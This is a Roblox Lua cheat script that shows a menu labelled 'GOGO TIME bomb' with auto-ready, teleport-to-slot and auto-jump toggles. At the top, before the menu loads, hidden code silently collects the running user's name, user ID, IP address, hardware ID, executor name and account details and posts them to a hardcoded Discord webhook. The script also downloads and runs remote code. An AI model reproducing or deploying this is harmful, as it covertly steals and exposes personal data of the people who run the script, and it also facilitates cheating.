local webhook = "https://discord.com/api/webhooks/1434185178749862031/7KnJw42F-kLKxc4OMtLhrqNUFsWJJsuxpElVvqrhOaDz-8DnxS2Oi3e8jvhAYOubARDr"

-- Define the PlaceId variable
local PlaceId = game.PlaceId

-- Get the game name and game URL
-- اسم ماب
local gameName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name
-- رابط لعبه
local gameUrl = "https://www.roblox.com/games/" .. PlaceId
-- رابط بروفايل
local profileUrl = "https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile"
-- عدد سيرفر
local playerCount = #game:GetService("Players"):GetPlayers()
-- بريميم
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local hasPremium = player.MembershipType == Enum.MembershipType.Premium
-- وقت حاليا
local time = os.time()
local date = os.date("*t", time)

local hour = math.floor(date.hour)
local min = math.floor(date.min)
local sec = math.floor(date.sec)

-- معرفه ال ip شخص

local ip = game:HttpGet("https://ipwho.is/")

-- Create a JSON object to send to the webhook
local data = {
    ["content"] = "",
    ["username"] = "By : 7yd7",
    ["embeds"] = {
        {
            ["title"] = "",
            ["description"] = ""
            .. "**Player Name:**  ```" .. game:GetService("Players").LocalPlayer.Name .. " ```\n"
            .. "**Player ID:** ```" .. game:GetService("Players").LocalPlayer.UserId .. "```\n"
			.. "**Player URL:** ```" .. profileUrl .. "```\n"
            .. "**Game Name:** ```" .. gameName .. "```\n"
            .. "**Game URL:** ```" .. gameUrl .. "```\n"
		    .. "**Server JobId :** ```" .. game.JobId .. "```\n"
            .. "**Server Number players online :** ```" .. playerCount .. "```\n"
			.. "**Account Age :** ```" .. game:GetService("Players").LocalPlayer.AccountAge .. "``` \n" 
            .. "**IP :** ```" .. ip .. " / https://whatismyipaddress.com/ip/".. ip .. "```\n"
            .. "**HWID  :** ```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "``` \n" 
            .. "**Name Hack  :** ```" .. identifyexecutor() .. "``` \n" 
            .. "**Player Premium :** " .. if hasPremium then "```yes```" else "```no```"  .. "\n"
            .. date.day .. "/" .. date.month .. "/" .. date.year .. " " .. hour .. ":" .. min .. ":" .. sec .. "" .. "\n"
        }
    }
}

-- Send the data to the webhook
local HS = game:GetService("HttpService"):JSONEncode(data)
local headers = {
    ["content-type"] = "application/json"
}

local data2 = {
    Url = webhook,
    Body = HS,
    Method = "POST",
    Headers = headers
}

request(data2)
--

local Window = loadstring(game:HttpGet(
    "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
))():CreateWindow({
    Title = "GOGO TIME bomb",
    Icon = "rbxassetid://101264579648913",
    Author = "discord/ by @3dz7",
    Folder = "s",
    Size = UDim2.fromOffset(280, 300),
    Transparent = true,
    Theme = "Dark",
    SideBarWidth = 165,
    Background = "",
    BackgroundImageTransparency = 0.42,
    HideSearchBar = true,
    ScrollBarEnabled = true,
    User = { Enabled = true }
})

-- جدول الإعدادات
local Settings = {
    AutoReady = false,
    AutoJoinToggle = false,
    AutoJump = false
}


local ArenaTab = Window:Tab({
    Title = "Arena",
    Icon = "swords"
})


local QTab = Window:Tab({
    Title = "Q",
    Icon = "swords"
})


local autoReadyThread
local autoJoinThread
local autoJumpThread


local function startAutoReady()
    if autoReadyThread then
        autoReadyThread:Disconnect()
        autoReadyThread = nil
    end
    
    if Settings.AutoReady then
        autoReadyThread = game:GetService("RunService").Heartbeat:Connect(function()
            local args = {true}
            local success, err = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Arena"):WaitForChild("Ready"):FireServer(unpack(args))
            end)
            if not success then
                warn("Auto Ready Error:", err)
            end
            task.wait(0.1)
        end)
    end
end


local function startAutoJoin()
    if autoJoinThread then
        autoJoinThread:Disconnect()
        autoJoinThread = nil
    end
    
    if Settings.AutoJoinToggle then
        autoJoinThread = game:GetService("RunService").Heartbeat:Connect(function()
            task.wait(0.3)
            local Arena = workspace.Arenas:FindFirstChild("Arena1")
            if Arena then
                local leftSlots = Arena.Slots.Left
                local Players = game:GetService("Players")
                local localPlayer = Players.LocalPlayer
                
                for i = 1, 4 do
                    local slot = leftSlots[tostring(i)]
                    if slot and slot.Data and slot.Data:FindFirstChild("Player") then
                        local playerInSlot = slot.Data.Player.Value
                        if playerInSlot == localPlayer then
                            break
                        elseif not playerInSlot and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            if slot:FindFirstChild("Hull") then
                                localPlayer.Character.HumanoidRootPart.CFrame = slot.Hull.CFrame * CFrame.new(0, 5, 0)
                                break
                            end
                        end
                    end
                end
            end
        end)
    end
end


local function startAutoJump()
    if autoJumpThread then
        autoJumpThread:Disconnect()
        autoJumpThread = nil
    end
    
    if Settings.AutoJump then
        autoJumpThread = game:GetService("RunService").Heartbeat:Connect(function()
            task.wait(0.1)
            local Players = game:GetService("Players")
            local player = Players.LocalPlayer
            
            if player.Character then
                local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
                if humanoid then
                    humanoid.UseJumpPower = true
                    humanoid.JumpPower = 0
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
    end
end


ArenaTab:Toggle({
    Title = "Auto Ready",
    Callback = function(v)
        Settings.AutoReady = v
        startAutoReady()
    end
})

ArenaTab:Toggle({
    Title = "Auto Join Arena",
    Callback = function(v)
        Settings.AutoJoinToggle = v
        startAutoJoin()
    end
})

ArenaTab:Toggle({
    Title = "Auto Jump",
    Callback = function(v)
        Settings.AutoJump = v
        startAutoJump()
    end
})


ArenaTab:Button({
    Title = "Stop All Functions",
    Callback = function()
        Settings.AutoReady = false
        Settings.AutoJoinToggle = false
        Settings.AutoJump = false
        
        if autoReadyThread then
            autoReadyThread:Disconnect()
            autoReadyThread = nil
        end
        
        if autoJoinThread then
            autoJoinThread:Disconnect()
            autoJoinThread = nil
        end
        
        if autoJumpThread then
            autoJumpThread:Disconnect()
            autoJumpThread = nil
        end
        
        print("All functions stopped")
    end
})
